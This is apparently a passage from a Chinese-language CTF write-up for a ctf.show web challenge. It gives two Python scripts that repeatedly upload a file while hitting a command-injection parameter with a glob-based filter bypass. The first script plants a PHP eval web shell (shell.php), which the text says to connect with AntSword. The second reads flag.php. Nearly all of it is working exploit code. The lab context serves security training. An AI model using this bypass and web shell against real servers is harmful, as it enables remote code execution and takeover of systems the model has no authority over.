+<p>先使用python脚本上传文件并访问，这样就能生成一个shell.php文件</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">import</span> requests<br><br>url2 = <span class="hljs-string">&#x27;http://03b01a20-43d6-439e-b60d-6bb746c9332f.challenge.ctf.show/?c=.+/???/????????[@-[]&#x27;</span><br><span class="hljs-keyword">file</span> = &#123;<span class="hljs-string">&quot;file&quot;</span>:(<span class="hljs-string">&quot;mixbp.txt&quot;</span>,<span class="hljs-string">&quot;echo &#x27;&lt;?php eval($_POST[1]);&#x27; &gt; shell.php&quot;</span>)&#125;<br><br><br><span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:<br>    r = requests.post(url=url2,files=<span class="hljs-keyword">file</span>)<br></code></pre></td></tr></table></figure>
+
+<p>然后用蚁剑连接即可</p>
+<hr>
+<p>或者直接输出答案到python</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    url = <span class="hljs-string">&quot;http://25a61f1e-6750-49d2-a671-7bce2a18c52b.challenge.ctf.show/?c=.+/???/????????[@-[]&quot;</span><br>    r = requests.post(url, files=&#123;<span class="hljs-string">&quot;file&quot;</span>: (<span class="hljs-string">&#x27;mixbp.txt&#x27;</span>,<span class="hljs-string">&#x27;cat flag.php&#x27;</span>)&#125;)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;ctfshow&quot;</span> <span class="hljs-keyword">in</span> r.<span class="hljs-built_in">text</span>:<br>        print(r.<span class="hljs-built_in">text</span>)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
 
 
       
